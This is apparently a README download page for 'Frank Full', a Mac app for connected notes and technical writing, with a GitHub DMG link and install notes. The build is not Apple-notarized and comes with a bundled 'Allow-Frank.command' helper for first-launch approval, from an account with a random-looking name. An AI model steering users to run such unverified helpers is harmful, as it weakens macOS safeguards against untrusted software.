# Frank Full — room for a growing project

Frank is a Mac writing app that combines connected notes with tools for technical documents. Keep meeting notes and project ideas, write explanations with code and equations, and export documents for people who do not use Frank.

Full has **no built-in space or saved-page cap**.

**[Download Frank Full 5.5.1](https://github.com/7drbw7mdgf-lgtm/frank/releases/download/v5.5.1/Frank-5.5.1.dmg)** · [Installation guide](MACOS-INSTALL.md) · [See the interface and features](../README.md)

Use folders, tags, search, backlinks, and the knowledge graph to organize your work. Add code blocks, equations, diagrams, tables, images, and checklists to your writing. Import or export familiar document formats, and use Focus mode when you want a quieter writing session.

## Install

Requires **macOS 11 or later**, on Apple Silicon or Intel. Open the DMG and drag **Frank.app** into Applications. The build is ad hoc signed and not Apple-notarized; the [guide](MACOS-INSTALL.md) covers first-launch approval. The DMG includes the matching `Allow-Frank.command` helper.

This folder contains the same installer, checksum, helper, and guide as the GitHub release. For a smaller workspace capped at one space and three saved pages, see [Frank Lite](../lite/).

For questions or bugs, [open an issue](https://github.com/7drbw7mdgf-lgtm/frank/issues).
